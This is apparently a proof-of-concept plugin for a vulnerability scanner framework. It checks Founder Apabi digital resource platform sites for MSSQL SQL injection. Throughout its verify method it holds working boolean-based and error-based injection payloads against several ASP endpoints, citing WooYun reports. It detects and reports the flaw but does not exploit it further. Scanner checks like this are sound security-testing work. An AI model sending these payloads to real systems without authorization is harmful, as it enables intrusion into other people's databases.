# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Founder_0001' # 平台漏洞编号，留空
    name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        方正Apabi数字资源平台 /DLib/List1.asp 页面存在多处MSSQL SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '方正Apabi数字资源平台'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'af7872d9-ea51-4057-b723-39137733f561'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0103712
            payload1 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=1&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
            payload2 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=2&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
            code1, head1, body1, errcode1, final_url1 = hh.http(self.target + payload1)
            code2, head2, body2, errcode2, final_url2 = hh.http(self.target + payload2)
            if code1==200 and code2==200 and len(body1)!=len(body2):
                #security_hole(arg+payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
            payload = "/dlib/bbs/bbs_search.asp?lang=gb"
            post = "key=1%27%29%20and%201%3Dconvert%28int%2C%27hen%27%2b%27tai%27%29%20and%20%28%271%27%20like%20%271"
            code, head, body, errcode1, final_url = hh.http(self.target + payload, post=post)
            if 'hentai' in body:
                #security_hole(arg+payload+" && post:"+post)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0102763
            #No.4 http://www.wooyun.org/bugs/wooyun-2010-0102829
            #No.5 http://www.wooyun.org/bugs/wooyun-2010-0102760
            #No.6 http://www.wooyun.org/bugs/wooyun-2010-0102822
            payloads = [
                "/dlib/dir.asp?lang=gb&DocID=convert%28int,%27hen%27%2b%27tai%27%29",
                "/tree/deeptree.asp?DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&hide=1&CategoryTypeID=1",
                "/dlib/netlinkhandler.asp?lang=gb&DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&FieldID=convert%28int,%27hen%27%2b%27tai%27%29&FieldName=Creator&FieldType=1&QueryValue=%C1%D6%C9%BD&Repeatable=True",
                "/dlib/AddMyFavourite.asp?lang=gb&DocID=convert%28int%2C%27hen%27%2b%27tai%27%29%20--%20hehe",
            ]
            for payload in payloads:
                code, head, body, errcode1, final_url = hh.http(self.target + payload)
                if 'hentai' in body:
                    #security_hole(arg+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
